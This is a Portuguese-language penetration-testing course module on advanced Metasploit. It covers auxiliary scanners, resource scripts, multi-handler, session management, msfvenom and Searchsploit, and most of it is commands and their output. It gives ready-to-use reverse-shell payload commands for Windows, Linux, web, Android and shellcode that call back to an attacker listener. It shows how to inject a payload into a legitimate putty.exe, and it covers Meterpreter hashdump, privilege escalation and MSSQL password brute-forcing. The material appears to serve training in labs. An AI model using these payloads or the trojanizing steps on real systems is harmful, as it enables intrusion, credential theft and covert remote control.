# 🔧 08. Metasploit Avançado e msfvenom

> Metasploit não é só "use exploit, set RHOSTS, run". Auxiliary scanners, resource scripts, multi-handler, sessões e msfvenom são o que separam um uso superficial de um engajamento profissional.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 90min | ⭐⭐⭐⭐ Avançado | `msfconsole, msfvenom, multi-handler` |

</div>

---

## 🎓 Por que isso importa?

O arquivo 05 mostrou Metasploit como ferramenta de exploração (EternalBlue, BlueKeep). Mas Metasploit tem **duas faces igualmente poderosas**: auxiliary scanners (enumeração em massa) e msfvenom (geração de payloads customizados). Este módulo cobre o que falta para um engajamento completo: automatização com resource scripts, gestão de sessões, geração de payloads em múltiplos formatos e handlers.

**Versão atual:** Metasploit Framework **6.5** (julho 2026). Novidades incluem MCP Server para IA, MITRE ATT&CK tagging e suporte a Malleable C2 profiles.

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| Metasploit básico (msfconsole, RHOSTS, exploit) | Sim | Arquivo 05 |
| Payloads reverse vs bind | Sim | Arquivo 09 |
| Redes (IP, portas, protocolo) | Sim | Módulo 00 |

---

## 🎯 Quando usar este módulo

- Quando precisa escanear uma rede inteira rapidamente (auxiliary scanners)
- Quando quer gerar payloads customizados (exe, elf, apk, hta, psh)
- Quando precisa de handler em background para múltiplas sessões
- Quando quer automatizar sequências de comandos (resource scripts)

---

## 🔍 Auxiliary Scanners

Auxiliary scanners fazem enumeração **sem explorar**. São ideais para扫描 em massa e coleta de dados.

### Sintaxe geral

```
msf6 > use auxiliary/scanner/<protocol>/<scanner>
msf6 auxiliary(scanner/<protocol>/<scanner>) > set RHOSTS <target>
msf6 auxiliary(scanner/<protocol>/<scanner>) > set THREADS <n>
msf6 auxiliary(scanner/<protocol>/<scanner>) > run
```

### Scanners mais usados

#### TCP Port Scanner
```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 21,22,25,80,443,445,3389,8080
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.1.1:443 - TCP OPEN
[+] 192.168.1.20:445 - TCP OPEN
[+] 192.168.1.30:22 - TCP OPEN
[*] Scanned 256 of 256 hosts (100% complete)
```

#### SMB Version + Enum
```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > run

[+] 192.168.1.20:445  Windows 10 Pro 19041 (Windows 10 Pro Build 19041)
[*] Scanned 256 of 256 hosts (100% complete)

msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.1.20
msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBUser administrator
msf6 auxiliary(scanner/smb/smb_enumshares) > set SMBPass password123
msf6 auxiliary(scanner/smb/smb_enumshares) > run

[+] 192.168.1.20:445   NETLOGON (Disk)
[+] 192.168.1.20:445   SYSVOL (Disk)
[+] 192.168.1.20:445   SharedDocs (Disk)
```

#### SSH Version
```
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ssh/ssh_version) > set THREADS 20
msf6 auxiliary(scanner/ssh/ssh_version) > run

[*] 192.168.1.10:22, SSH server version: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
[*] 192.168.1.15:22, SSH server version: SSH-2.0-OpenSSH_6.6p1 Ubuntu-2ubuntu1
```

#### HTTP Title
```
msf6 > use auxiliary/scanner/http/title
msf6 auxiliary(scanner/http/title) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/http/title) > set THREADS 50
msf6 auxiliary(scanner/http/title) > run

[+] 192.168.1.5:80 [C:301] [R:/admin] [S:Apache/2.4.52] Admin Panel
[+] 192.168.1.10:8080 [C:200] [S:nginx/1.18.0] Dashboard
```

#### FTP Anonymous
```
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ftp/anonymous) > run

[+] 192.168.1.25:21   Anonymous READ (220 vsftpd 3.0.3)
```

#### MSSQL Scanner (exemplo diferente de SMB/FTP/SSH/RDP)
```
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/mssql/mssql_ping) > run

[+] 192.168.1.30 - SQL Server information:
    Server Name: SQLSERVER01
    Server Version: 15.00.2000
    Named Pipes: \SQLSERVER01\pipe\sql\query

msf6 > use auxiliary/scanner/mssql/mssql_login
msf6 auxiliary(scanner/mssql/mssql_login) > set RHOSTS 192.168.1.30
msf6 auxiliary(scanner/mssql/mssql_login) > set USERNAME sa
msf6 auxiliary(scanner/mssql/mssql_login) > set PASS_FILE /usr/share/seclists/Passwords/Top1000.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set THREADS 10
msf6 auxiliary(scanner/mssql/mssql_login) > run

[+] 192.168.1.30:1433 - LOGIN SUCCESSFUL: sa:Password1
```

---

## 📜 Resource Scripts (.rc)

Resource scripts automatizam sequências de comandos no msfconsole.

### Criar e executar

```bash
# Criar script
cat > auto_scan.rc << 'EOF'
workspace -a engajamento_2026
db_nmap -sV -sC -p- --open 192.168.1.0/24

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 50
run

use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
set THREADS 20
run
EOF

# Executar ao iniciar o msfconsole
msfconsole -r auto_scan.rc

# Ou dentro do msfconsole
msf6 > resource auto_scan.rc
```

### Resource script com Ruby embutido

```ruby
# autoexploit.rc — itera módulos sobre hosts descobertos
workspace -a http_enum
db_nmap -Pn -T4 -n -v -p 80 --open 192.168.1.0/24

use auxiliary/scanner/http/title
run_single("set RHOSTS #{framework.db.hosts.map(&:address).join(' ')}")
run
```

### Resource script para handler em background

```ruby
# handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

---

## 🔔 Multi-Handler (exploit/multi/handler)

O multi-handler é um **listener genérico** que recebe conexões de payloads do msfvenom ou de explorações.

### Configuração completa

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j -z

[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.5:4444
```

| Flag | Descrição |
|:-----|:----------|
| `-j` | Executa como job em background |
| `-z` | Não interage com sessão ao receber |
| `-i` | Interage imediatamente |
| `ExitOnSession false` | Mantém listener vivo para múltiplas sessões |

### One-liner do terminal

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; set ExitOnSession false; run -j"
```

### Listar jobs

```
msf6 > jobs -v

Jobs
====

Id  Name                 Payload                              Payload opts
--  ----                  -------                              ------------
0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://10.10.14.5:4444
```

---

## 🎛️ Session Management

### Comandos de sessão

| Comando | Descrição |
|:--------|:----------|
| `sessions` ou `sessions -l` | Lista todas as sessões ativas |
| `sessions -l -v` | Lista detalhada (verbose) |
| `sessions -i <ID>` | Interage com sessão específica |
| `sessions -i -1` | Interage com a última sessão |
| `sessions -u <ID>` | Upgrade shell para Meterpreter |
| `sessions -k <ID>` | Mata uma sessão específica |
| `sessions -K` | Mata todas as sessões |
| `sessions -C "comando" -i <ID>` | Roda comando em sessão específica |
| `sessions -C "comando"` | Roda comando em TODAS as sessões |
| `sessions -n nome` | Renomeia uma sessão |

### Dentro de Meterpreter

| Comando | Descrição |
|:--------|:----------|
| `background` ou `bg` | Coloca sessão em background |
| `shell` | Dropa para shell nativo |
| `sysinfo` | Info do sistema |
| `getuid` | Usuário atual |
| `getpid` | PID do processo atual |
| `ps` | Lista processos |
| `migrate <PID>` | Migra para outro processo |
| `hashdump` | Dump de hashes SAM |
| `getsystem` | Tenta escalação de privilégio |
| `load incognito` | Token impersonation |

### Upgrade de shell básico para Meterpreter

```
msf6 > sessions -u 2
[*] Command stager progress 1.00% (1 of 1 bytes)
[*] Command stager progress 13.33% (8 of 60 bytes)
...
[*] Meterpreter session 3 opened (10.10.14.5:4444 -> 192.168.1.20:49152)
```

### Migração de processo

```
meterpreter > ps

Process list
============
   PID   Name                      Path
   ---   ----                      ----
   648   svchost.exe               C:\WINDOWS\system32\svchost.exe
   1432  Explorer.EXE              C:\WINDOWS\Explorer.EXE

meterpreter > migrate 1432
[*] Migrating to 1432...
[*] Migration completed successfully.
meterpreter > getpid
Current pid: 1432
```

**Por que migrar?** O processo original pode morrer (timeout, crash), matando a sessão. `explorer.exe` é estável e permanece vivo enquanto o usuário estiver logado.

---

## 🔨 msfvenom — Gerador de Payloads

### Sintaxe completa

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<porta> -f <formato> -o <arquivo>
```

| Flag | Descrição |
|:-----|:----------|
| `-p, --payload` | Payload a usar |
| `-f, --format` | Formato de saída (exe, elf, raw, c, etc.) |
| `-e, --encoder` | Encoder (x86/shikata_ga_nai, etc.) |
| `-i, --iterations` | Iterações de encoding |
| `-b, --bad-chars` | Bytes a evitar ('\x00\x0a\x0d') |
| `-o, --out` | Salvar em arquivo |
| `-a, --arch` | Arquitetura (x86, x64) |
| `--platform` | Plataforma (windows, linux) |
| `-n, --nopsled` | NOP sled antes do payload |
| `-x, --template` | Template de executável |
| `-k, --keep` | Manter comportamento do template |

### Payloads mais usados por formato

#### Windows
```bash
# EXE — reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell.dll

# MSI (instalador)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o shell.msi

# HTA (HTML Application — executa via mshta.exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f hta-psh -o shell.hta

# PowerShell one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd
```

**Saída esperada (EXE):**
```
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

#### Linux
```bash
# ELF — binário
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell

# Bash one-liner
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```

#### Web
```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# JSP (WAR — Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```

#### Android
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f apk -o shell.apk
```

#### Shellcode (para buffer overflows)
```bash
# Formato C
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00\x0a\x0d' -f c

# Formato Python
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python -v shellcode
```

### Reverse vs Bind

| Aspecto | Reverse Shell | Bind Shell |
|:--------|:-------------|:-----------|
| Direção | Target conecta ao atacante | Atacante conecta ao target |
| Listener | Roda no atacante | Roda no target |
| Behind firewall | Funciona (outbound) | Não funciona (inbound bloqueado) |
| Uso padrão | **99% dos casos** | Labs/testes |
| Payload | `reverse_tcp` | `bind_tcp` |

### Sobre Encoders

```bash
# Listar encoders
msfvenom -l encoders
```

**⚠️ Nota importante:** Encoders como `x86/shikata_ga_nai` são **polimórficos** — geram payload diferente a cada execução. Porém, **não são efetivos contra EDRs modernos** que usam análise comportamental. O uso legítimo de encoders é remoção de bad characters em exploits de buffer overflow, não evasão de AV/EDR.

```bash
# Encoding para remover bad characters
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -i 3 -f c
```

### Usando template personalizado

```bash
# Injetar payload em executável legítimo
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -k -x /path/to/putty.exe -e x86/shikata_ga_nai -a x86 \
  --platform windows -i 5 -f exe -o putty_infected.exe
```

---

## 🔍 Searchsploit — Busca Offline de Exploits

Searchsploit é a interface CLI do **Exploit-DB** — uma base de dados com 40.000+ exploits e PoCs. Funciona offline e se integra com Nmap para encontrar exploits automaticamente a partir de um scan.

### Instalação

```bash
# Pré-instalado no Kali
searchsploit --version
```

### Flags Principais

| Flag | Descrição |
|:-----|:----------|
| `<termo>` | Buscar exploits por palavra-chave |
| `-c <termo>` | Busca case-insensitive |
| `-x <ID>` | Ver código-fonte do exploit |
| `-m <ID>` | Copiar exploit para o diretório atual |
| `--nmap <arquivo>` | Buscar exploits baseado no output XML do Nmap |
| `--cve <CVE>` | Buscar por CVE específico |
| `-p` | Mostrar path completo do exploit |
| `-s` | Busca exata (sem variações) |
| `-t` | Título da tabela (formato compacto) |
| `--exclude="termo"` | Excluir resultados com termo específico |
| `-j` | Output em formato JSON |

### Exemplo 1 — Busca básica

```bash
searchsploit windows 7 smb
```

**✅ Output esperado:**
```
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------ ---------------------------------
Microsoft Windows 7/8/2008 R2/2012 SMB (MS17-010) - EternalBlue   | windows/remote/42315.py
Microsoft Windows 7/8/2008 R2/2012 SMB - Remote Code Execution    | windows/remote/42031.py
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Result
```

**O que procurar:** A coluna `Path` mostra o caminho do exploit. O ID `42315` é o número no Exploit-DB.

### Exemplo 2 — Buscar por CVE

```bash
searchsploit --cve 2017-0144
```

**✅ Output esperado:**
```
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------ ---------------------------------
Microsoft Windows 7/8.1/2008 R2/2012/2016 R2 - EternalBlue SMB     | windows/remote/42315.py
------------------------------------------------------------------ ---------------------------------
```

### Exemplo 3 — Ver código do exploit

```bash
searchsploit -x 42315
```

**O que acontece:** Abre o código-fonte do exploit para análise. Verifique se o exploit é um PoC (prova de conceito) ou um módulo Metasploit.

### Exemplo 4 — Copiar exploit para diretório atual

```bash
searchsploit -m 42315
```

**✅ Output esperado:**
```
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012/2016 R2 - EternalBlue SMB
  Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
  Copied to: ./42315.py
```

### Exemplo 5 — Integração com Nmap

```bash
# 1. Scan Nmap com output XML
nmap -sV -sC -oX scan.xml 192.168.1.0/24

# 2. Buscar exploits baseado nos serviços encontrados
searchsploit --nmap scan.xml
```

**O que acontece:** O Searchsploit lê o XML do Nmap, identifica versões de serviços e busca exploits correspondentes automaticamente.

### Exemplo 6 — Excluir resultados indesejados

```bash
# Excluir exploits Windows (quando busca é Linux)
searchsploit linux kernel --exclude="Windows"
```

### Exemplo 7 — Output JSON para scripts

```bash
searchsploit -j apache 2.4 | python3 -m json.tool
```

### Integração com Metasploit

```bash
# 1. Encontrar exploit no Searchsploit
searchsploit ms17-010

# 2. Copiar
searchsploit -m 42315

# 3. Analisar o código (verificar IP, porta, payload)

# 4. Usar no Metasploit (se for módulo MSF)
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
exploit
```

### Erros comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| `Exploit not found` | Termo de busca errado | Tente sinônimos ou busque por CVE |
| `Permission denied` | Sem permissão de escrita | Use `sudo` ou copie para outro diretório |
| `searchsploit: command not found` | Não instalado | `sudo apt install -y exploitdb` |

---

## 🔗 Handlers Correspondentes

Para cada payload gerado, configure o handler correspondente:

| Payload | Handler |
|:--------|:--------|
| `windows/x64/meterpreter/reverse_tcp` | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` |
| `php/meterpreter/reverse_tcp` | `set PAYLOAD php/meterpreter/reverse_tcp` |
| `java/jsp_shell_reverse_tcp` | `set PAYLOAD java/jsp_shell_reverse_tcp` |
| `linux/x64/shell_reverse_tcp` | `set PAYLOAD linux/x64/shell_reverse_tcp` |
| `cmd/unix/reverse_bash` | `set PAYLOAD cmd/unix/reverse_bash` |
| `android/meterpreter/reverse_tcp` | `set PAYLOAD android/meterpreter/reverse_tcp` |

**Exemplo — handler para PHP webshell:**
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:4444
[*] Sending stage (39927 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 192.168.1.10:49234)
```

---

## 🗄️ Workspace e Database

### Inicializar banco de dados

```bash
sudo msfdb init    # Primeira vez
sudo msfdb run     # Iniciar msfconsole com DB
```

### Workspace management

```
msf6 > workspace                          # Lista workspaces
msf6 > workspace -a engajamentoA          # Cria workspace
msf6 > workspace engajamentoB             # Muda de workspace
msf6 > workspace -v                       # Lista verbose (hosts, services)
msf6 > workspace -d engajamentoA          # Deleta workspace
```

### Comandos de banco de dados

| Comando | Descrição |
|:--------|:----------|
| `db_nmap` | Nmap que salva resultados no DB |
| `db_import <arquivo.xml>` | Importa Nmap XML, Nessus |
| `db_export -f xml -o <arquivo.xml>` | Exporta workspace |
| `hosts` | Lista hosts descobertos |
| `services` | Lista serviços |
| `vulns` | Lista vulnerabilidades |
| `creds` | Lista credenciais |

**Exemplo:**
```
msf6 > workspace -a clientA
msf6 > db_nmap -sV -sC -p- --open 192.168.1.0/24

msf6 > hosts
Hosts
=====
address       mac                os_name  purpose
192.168.1.20  00:0C:29:XX:XX:XX  Windows  client

msf6 > services
Services
=========
host          port  proto  name         state  info
192.168.1.20  22    tcp    ssh          open   OpenSSH 8.9p1
192.168.1.20  445   tcp    microsoft-ds open   Windows 10
```

### Flags do msfconsole

| Flag | Descrição |
|:-----|:----------|
| `-q` | Inicia sem banner (quiet) |
| `-r FILE` | Roda RC script ao iniciar |
| `-x "cmd"` | Executa comandos na inicialização |
| `-n` | Sem suporte a banco de dados |
| `--count` | Conta módulos (novidade 6.5) |

---

## 📋 Resumo: Workflow Completo

```bash
# 1. Inicializar
sudo msfdb run

# 2. Workspace
workspace -a engajamento_2026

# 3. Scan com db_nmap
db_nmap -sV -sC -p- --open 192.168.1.0/24

# 4. Enumeração
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# 5. Gerar payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# 6. Handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j -z

# 7. Interagir
sessions -l
sessions -i 1

# 8. Post-exploitation
meterpreter > getuid
meterpreter > hashdump

# 9. Exportar
db_export -f xml -o /root/engajamento.xml
```

---

## ❌ Erros Comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| "Handler não recebe conexão" | Payload e handler não coincidem | Verificar que PAYLOAD/LHOST/LPORT são idênticos |
| "Session died" | Processo alvo morreu | `migrate` para processo estável (explorer.exe) |
| "db_nmap não salva" | DB não inicializado | `sudo msfdb init` |
| "Payload muito grande" | Template + payload > espaço disponível | Usar payload menor ou shellcode direto |
| "Encoder não evita EDR" | EDRs usam análise comportamental | Usar payloads customizados ou manual |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Metasploit Intro](https://tryhackme.com/room/metasploitintro) | Fundamentals, msfconsole, auxiliary | 45min |
| 2 | TryHackMe | [Metasploit Exploitation](https://tryhackme.com/room/metasploitexploitation) | msfvenom, handlers, sessions | 60min |
| 3 | HackTheBox | [Starting Point](https://app.hackthebox.com/starting-point) | Metasploit em máquinas reais | 90min |
| 4 | TryHackMe | [Blue](https://tryhackme.com/room/blue) | EternalBlue completo (ref. arquivo 05) | 60min |

---

## 📚 Referências

- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Documentation](https://docs.rapid7.com/metasploit/)
- [HackTricks Metasploit Cheatsheet](https://book.hacktricks.xyz/pesquisas-avancadas/metasploit)
- [PayloadsAllTheThings — Metasploit](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GitHub Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [Exploit-DB](https://www.exploit-db.com/)
- [Searchsploit — GitHub](https://gitlab.com/exploit-database/exploitdb)
- [MITRE ATT&CK — Exploitation for Client Execution (T1204)](https://attack.mitre.org/techniques/T1204/002/)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Usar auxiliary scanners para enumeração em massa (SMB, SSH, HTTP, MSSQL)
- [ ] Criar e executar resource scripts (.rc)
- [ ] Configurar multi-handler em background para múltiplas sessões
- [ ] Gerar payloads com msfvenom nos formatos exe, elf, apk, hta, psh, war
- [ ] Entender a diferença entre reverse e bind shell
- [ ] Gerar shellcode em formato C e Python
- [ ] Gerenciar sessões (listar, interagir, migrar, matar)
- [ ] Usar workspace e db_nmap para organizar engajamentos
- [ ] Configurar handler correto para cada payload gerado
- [ ] Buscar exploits no Searchsploit por palavra-chave e CVE
- [ ] Integrar Nmap XML com Searchsploit para busca automática de exploits
